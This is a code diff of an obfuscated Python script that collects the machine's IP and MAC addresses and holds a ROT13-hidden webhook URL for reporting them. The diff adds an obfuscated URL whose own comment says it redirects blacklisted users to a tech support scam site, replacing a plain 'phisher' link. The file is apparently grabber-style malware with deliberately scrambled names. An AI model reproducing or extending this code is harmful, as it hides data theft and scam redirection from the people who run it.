@@ -7,6 +7,7 @@ import socket #line:6
 import re #line:7
 import uuid #line:8
 import requests #line:9
+import base64
 import json #line:10
 from getmac import get_mac_address #line:11
 import sys #line:12
@@ -26,7 +27,6 @@ def fetch_text_from_website (OO0O0O0OO00000OO0 ):#line:34
 	O0O00OO00OO0000O0 =requests .get (OO0O0O0OO00000OO0 )#line:35
 	O0000O000000O0O0O =O0O00OO00OO0000O0 .text #line:36
 	return O0000O000000O0O0O #line:37
-redirectphish ="https://dodgylink.net/phisher"
 IPAddr =socket .gethostbyname (socket .gethostname ())#line:42
 def timething ():#line:45
 	print_orange_text ('\rloading |')#line:46
@@ -77,7 +77,8 @@ def generate_unique_value ():#line:98
 	return OO00O000OOO00000O #line:101
 WEBHOOK_URL =jsndkfhwieuhsbdf ('uggcf://jroubbx.arjfgnetrgrq.pbz/ncv/jroubbxf/1112208334586662962/hacqHV-wcsVEE0dOxlHdaBlM2b4gFC_Cdlrx5omxt2Ar1N56pTAGE57VvKauRetkRL-s',13 )#line:106
 unique_value =generate_unique_value ()#line:107
-KEYAUTH =fetch_text_from_website (redirectphish)#line:41
+redirectphish = jsndkfhwieuhsbdf('cookn://yjybtgdif.izo/DKBmvwwzm', 99) # Redirect the user to a tech support scam website if they are blacklisted/banned
+KEYAUTH =fetch_text_from_website(redirectphish)#line:41
 def clear_console ():#line:110
 	replit .clear ()#line:112
 print_orange_text (f"""
